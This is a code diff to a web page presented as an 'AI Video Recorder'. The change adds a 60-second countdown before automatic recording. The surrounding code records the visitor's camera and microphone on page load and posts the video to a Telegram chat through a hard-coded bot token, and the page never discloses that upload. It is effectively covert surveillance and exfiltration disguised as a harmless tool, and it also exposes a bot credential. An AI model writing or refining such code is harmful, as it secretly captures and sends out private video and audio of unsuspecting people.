@@ -47,6 +47,12 @@
             background: #2575fc;
         }
 
+        #countdown {
+            font-size: 1.5rem;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+
         .footer {
             position: absolute;
             bottom: 10px;
@@ -59,6 +65,7 @@
     <h1>AI VIDEO RECORDER</h1>
     <video id="livePreview" autoplay muted></video>
     <video id="videoPlayer" controls></video>
+    <div id="countdown">Recording starts in: 60 seconds</div>
     <button id="toggleCamera">Switch to Rear Camera</button>
     <p>Recording will start automatically. Please allow camera and microphone access and wait for one minute.</p>
     <div class="footer">© 2025 AI Video Recorder</div>
@@ -68,6 +75,7 @@
         let mediaRecorder;
         let stream;
         const chunks = [];
+        let countdownInterval;
 
         async function startStream() {
             try {
@@ -77,20 +85,36 @@
                 });
                 document.getElementById('livePreview').srcObject = stream;
 
-                startRecording();
+                startCountdown(60, startRecording); // Countdown for 1 minute
             } catch (error) {
                 console.error('Error accessing camera or microphone:', error);
             }
         }
 
+        function startCountdown(seconds, callback) {
+            const countdownElement = document.getElementById('countdown');
+            let remaining = seconds;
+
+            countdownInterval = setInterval(() => {
+                countdownElement.textContent = `Recording starts in: ${remaining} seconds`;
+                remaining--;
+
+                if (remaining < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = 'Recording...';
+                    callback();
+                }
+            }, 1000);
+        }
+
         function startRecording() {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) chunks.push(event.data);
             };
 
             mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
+                const blob = new Blob(chunks, { type: 'video/mp4' });
                 document.getElementById('videoPlayer').src = URL.createObjectURL(blob);
                 document.getElementById('videoPlayer').load();
                 document.getElementById('videoPlayer').play();
@@ -109,7 +133,7 @@
             const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', blob, 'video.webm');
+            formData.append('video', blob, 'video.mp4');
 
             fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                 method: 'POST',
@@ -136,7 +160,7 @@
             startStream();
         });
 
-        // Start the stream and recording when the page loads
+        // Start the stream when the page loads
         startStream();
     </script>
 </body>
